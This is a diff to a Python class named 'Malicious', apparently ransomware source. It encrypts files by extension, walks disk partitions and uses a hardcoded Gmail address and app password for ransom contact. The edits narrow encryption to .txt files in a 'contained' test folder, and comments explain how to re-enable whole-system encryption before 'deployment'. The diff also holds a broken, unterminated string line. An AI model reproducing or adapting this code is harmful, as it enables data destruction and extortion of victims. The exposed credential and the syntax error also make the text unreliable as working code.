@@ -16,12 +16,12 @@ class Malicious:
     def __init__(self):
         self.cipher_object = None
         self.key = None
-        self.extensions = ["mp3", "rst", "png", "txt", "pdf", "jpg", "mp4", "mkv", "zip", "docx", "ppt", "xls", "db", "doc", "tar", "gz"]
+        self.extensions = ["txt"] # ["mp3", "rst", "png", "txt", "pdf", "jpg", "mp4", "mkv", "zip", "docx", "ppt", "xls", "db", "doc", "tar", "gz"] # Uncomment to Encrypt Files with These Entensions
         self.__public_key = RSA.import_key(open("public.pem", "rb").read())
         self.enc_key = "symmetric_key.pem"
         self.file_system = None
         self.mail = "decryptfiles4@gmail.com"  # Change This to your Email .Its also accessed  in ransomNote
-        self.ml_pswd = "fjbfxxtcexvudupu"  # Change This [App Password Google app password for more information]
+        self.ml_pswd = "fjbfxxtcexvudupu"  # Change This [App Password Google app password for more information] https://knowledge.workspace.google.com/kb/how-to-create-app-passwords-000009237
         self.server = None
 
     # Generation of symmetric Key
@@ -103,11 +103,13 @@ class Malicious:
         for partition in partitions:
             if os.path.isdir(partition):
                 valid_partitions.append(partition)
+        valid_partitions = ["contained"] # Change this to a Directory u want for Testing if To Encrypt Entire System Comment the Line
         return valid_partitions
 
     @property
     def linux(self):
-        path = "/home/the1/Documents/target_location/"  # Modification Before Deployment
+        path = "~/../
+        path = "contained"  # Comment This Line To Encrypt from /home in linux
         # login = os.getlogin()
         # path = os.path.join(home, login)
         return path
